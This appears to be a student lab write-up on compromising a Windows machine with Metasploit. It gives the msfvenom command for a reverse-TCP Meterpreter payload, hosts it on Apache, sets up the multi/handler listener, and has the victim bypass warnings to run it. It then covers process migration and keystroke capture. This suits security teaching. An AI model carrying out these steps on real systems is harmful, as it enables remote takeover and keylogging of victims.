# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/user-attachments/assets/6305f05a-7760-46cc-86e0-a02b10489d73)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![image](https://github.com/user-attachments/assets/e6878cd8-282f-46db-89e8-36944721bad7)

copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![image](https://github.com/user-attachments/assets/116de4cc-d9ba-4b5a-99ec-da62e7705f77)

Start apache server sudo systemctl apache2 start

## OUTPUT:
![image](https://github.com/user-attachments/assets/a19784f1-a936-4564-905b-696a26f92904)

Check the status of apache2

## OUTPUT:

![image](https://github.com/user-attachments/assets/31b20403-1a34-422e-9c8b-204521d0ab2d)

Invoke msfconsole:
## OUTPUT:
![image](https://github.com/user-attachments/assets/1723f84a-9593-4820-9684-60a7730b0bf4)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT:
![image](https://github.com/user-attachments/assets/c5ae6ff7-f89b-4384-a542-57cb1d59c4df)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

## OUTPUT:
![image](https://github.com/user-attachments/assets/a01cffbc-6ec1-4eaa-8c7d-dcc54cf499bf)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

## OUTPUT:
![image](https://github.com/user-attachments/assets/e4ad8749-3d43-489d-a527-1acc52ce46e6)

Bypass any warning boxes, double-click the file, and allow it to run.

![image](https://github.com/user-attachments/assets/f45d4aa4-c18c-4876-9e52-b32c9be161b4)

On kali give the command exploit

## OUTPUT:

![image](https://github.com/user-attachments/assets/bfcdcfa2-78d6-49ab-bce5-1ac2ef6051c7)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

## OUTPUT:

![image](https://github.com/user-attachments/assets/e61c6efb-19f6-4dfd-bc69-03d7fb96eeb5)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacteD

## OUTPUT:

![image](https://github.com/user-attachments/assets/1f093b33-938d-47bb-b66e-fac51a36aa8c)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.


## OUTPUT:
![image](https://github.com/user-attachments/assets/8c395ebf-ff86-4fe0-98ae-9aa86832f14a)


![image](https://github.com/user-attachments/assets/6da0cb33-d3f9-4062-8830-bb8c51d4bc5d)

keyscan_dump Shows the keystrokes captured so far

## OUTPUT:
![image](https://github.com/user-attachments/assets/8ba5ca15-62d5-4197-a237-428042056b97)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
